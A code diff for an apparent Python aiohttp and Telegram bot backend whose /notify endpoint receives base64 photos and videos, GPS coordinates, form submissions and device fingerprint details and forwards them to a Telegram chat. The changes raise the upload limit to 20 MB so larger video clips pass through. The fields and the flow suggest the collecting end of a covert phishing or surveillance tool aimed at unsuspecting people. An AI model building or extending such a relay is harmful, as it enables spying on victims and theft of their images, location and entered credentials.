@@ -132,10 +132,6 @@ def is_blocked_error(e: Exception) -> bool:
     ))
 
 async def retry_send(func, *args, **kwargs):
-    """
-    Універсальний ретрай з експоненціальним бекофом.
-    Зупиняється, якщо користувач заблокував бота або чат недоступний.
-    """
     max_attempts = kwargs.pop("_max_attempts", 5)
     base_sleep = kwargs.pop("_base_sleep", 0.8)
     for attempt in range(1, max_attempts + 1):
@@ -213,8 +209,10 @@ async def handle_notify(request: web.Request):
 
     try:
         data = await request.json()
-    except Exception:
-        return web.Response(status=400, text="Bad Request: invalid JSON")
+    except Exception as e:
+        # Додано логування для діагностики
+        logger.error(f"Помилка парсингу JSON: {e}. Розмір тіла запиту: {request.content_length} байт.")
+        return web.Response(status=400, text="Bad Request: invalid or too large JSON")
 
     chat_id = data.get("chat_id")
     event_data = data.get("event_data")
@@ -224,16 +222,13 @@ async def handle_notify(request: web.Request):
     chat = Chat(bot, chat_id)
     event_type = event_data.get("type")
     
-    # *** ОСНОВНІ ЗМІНИ ТУТ ***
     try:
-        # Обробка фотографій
         if event_type == "photos":
             caption = (
                 "📸 **Нові фото!**\n\n"
                 f"**Пристрій:** `{event_data.get('fingerprint','-')}`\n"
                 f"**Час:** `{event_data.get('collectedAt','-')}`"
             )
-            # Відправляємо фото по одному, щоб уникнути проблем з media group
             for idx, photo_b64 in enumerate(event_data.get("data", [])[:10]):
                 try:
                     payload = photo_b64.split(",", 1)[1] if "," in photo_b64 else photo_b64
@@ -248,7 +243,6 @@ async def handle_notify(request: web.Request):
                 except Exception as e:
                     logger.error(f"Не вдалося декодувати або відправити фото #{idx}: {e}")
         
-        # Обробка ВІДЕО (НОВИЙ БЛОК)
         elif event_type == "video":
             caption = (
                 "📹 **Нове відео!**\n\n"
@@ -260,7 +254,7 @@ async def handle_notify(request: web.Request):
                     payload = video_b64.split(",", 1)[1] if "," in video_b64 else video_b64
                     video_bytes = base64.b64decode(payload)
                     fh = BytesIO(video_bytes)
-                    fh.name = f"video_{idx+1}.webm"  # Telegram'у може знадобитися ім'я файлу
+                    fh.name = f"video_{idx+1}.webm"
                     await retry_send(
                         chat.send_video,
                         video=fh,
@@ -270,7 +264,6 @@ async def handle_notify(request: web.Request):
                 except Exception as e:
                     logger.error(f"Не вдалося декодувати або відправити відео #{idx}: {e}")
 
-        # Обробка геолокації
         elif event_type == "location":
             lat = event_data.get("data", {}).get("latitude")
             lon = event_data.get("data", {}).get("longitude")
@@ -285,7 +278,6 @@ async def handle_notify(request: web.Request):
             )
             await retry_send(chat.send_text, message_text, parse_mode="Markdown", disable_web_page_preview=True)
 
-        # Обробка даних з форми
         elif event_type == "form":
             form_id = event_data.get("formId", "-")
             fields = "\n".join(
@@ -300,7 +292,6 @@ async def handle_notify(request: web.Request):
             )
             await retry_send(chat.send_text, message_text, parse_mode="Markdown")
             
-        # Обробка інформації про пристрій (НОВИЙ БЛОК)
         elif event_type == "device_info":
             info_items = [f"- **{key}:** `{value}`" 
                           for key, value in (event_data.get("data") or {}).items()]
@@ -344,7 +335,10 @@ async def keep_alive():
 
 # ---------------- MAIN ----------------
 async def main():
-    app = web.Application()
+    # *** ОСНОВНЕ ВИПРАВЛЕННЯ ТУТ ***
+    # Збільшуємо максимальний розмір тіла запиту до 20 МБ
+    app = web.Application(client_max_size=20 * 1024 * 1024)
+    
     app.router.add_post("/notify", handle_notify)
     app.router.add_get("/", handle_health_check)
 
